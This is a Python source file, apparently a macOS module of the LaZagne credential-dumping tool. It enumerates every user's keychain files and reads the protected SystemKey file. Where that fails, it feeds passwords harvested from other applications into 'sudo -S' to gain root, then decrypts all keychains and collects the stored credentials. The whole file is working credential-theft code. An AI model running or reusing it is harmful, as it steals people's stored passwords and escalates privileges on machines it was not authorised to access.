# -*- coding: utf-8 -*- 
# !/usr/bin/python

# Awesome work done by @n0fate
# check the chainbreaker tool: https://github.com/n0fate/chainbreaker

import subprocess
import binascii
import traceback

from lazagne.softwares.system.chainbreaker_module.chainbreaker import *
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant

import os


class ChainBreaker(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'chainbreaker', 'system')

    def list_users(self):
        users_dir = '/Users'
        users_list = []
        if os.path.exists(users_dir):
            for user in os.listdir(users_dir):
                if user != 'Shared' and not user.startswith('.'):
                    users_list.append(user)

        return users_list

    def list_keychains(self, keychains_path):
        keychains = []
        if os.path.exists(keychains_path):
            for f in os.listdir(keychains_path):
                if 'keychain' in f:
                    keychains.append(os.path.join(keychains_path, f))
        return keychains

    def run(self):
        pwd_found = []
        # all passwords found on other applications
        passwords = constant.passwordFound
        # password entered by the user using the --password parameter
        if constant.user_password:
            passwords.insert(0, constant.user_password)

        # System keychain
        keychains = self.list_keychains('/Library/Keychains/')

        # Users keychains
        for user in self.list_users():
            keychains += self.list_keychains('/Users/{user}/Library/Keychains/'.format(user=user))

        # system key needs admin privilege to open the file
        system_key = ''
        try:
            # try to open it (suppose the file has bad privilege or that the tool is launched with sudo rights)
            key = open('/private/var/db/SystemKey').read()
            system_key = binascii.hexlify(str(key[8:32])).upper()
        except Exception as e:
            self.debug('SystemKey file could not be openned: {error}'.format(error=str(e)))
            try:
                # try to open the file using a password found (supposing a password is also used as a system password)
                for pwd in passwords:
                    c = 'sudo hexdump -e \'16/1 "%02x" ""\' -s 8 -n 24 /private/var/db/SystemKey |' \
                        'xargs python -c \'import sys;print sys.argv[1].upper()\''
                    cmd = 'echo {password}|sudo -S {cmd}'.format(password=pwd, cmd=c)

                    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = p.communicate()
                    if stdout:
                        system_key = stdout.strip()
                        self.info('SystemKey found ({system_key}) with sudo password {pwd}'.format(
                            system_key=system_key, pwd=pwd))
                        break
            except Exception:
                pass

        for keychain in keychains:
            pwd_ok = False
            for password in passwords:
                self.debug('Trying to dump keychain {keychain} with password {password}'.format(
                    keychain=keychain,
                    password=password)
                )
                try:
                    creds = dump_creds(keychain, password=str(password))
                    if creds:
                        pwd_found += creds
                        pwd_ok = True
                        constant.keychains_pwd.append(
                            {
                                'Keychain': keychain,
                                'Password': str(password)
                            }
                        )
                except Exception:
                    self.error('Check the password entered, this one not work (pwd: %s)' % str(password))
                    self.error(traceback.format_exc())

                if pwd_ok:
                    break

            if system_key and not pwd_ok:
                try:
                    creds = dump_creds(keychain, key=str(system_key))
                    if creds:
                        pwd_found += creds
                        pwd_ok = True
                        constant.keychains_pwd.append(
                            {
                                'Keychain': keychain,
                                'System Key': str(system_key)
                            }
                        )
                except Exception:
                    self.error('Check the system key found, this one not work (key: %s)' % str(system_key))
                    self.debug(traceback.format_exc())

        # keep in memory all passwords stored on the keychain
        constant.keychains_pwds = pwd_found

        return pwd_found
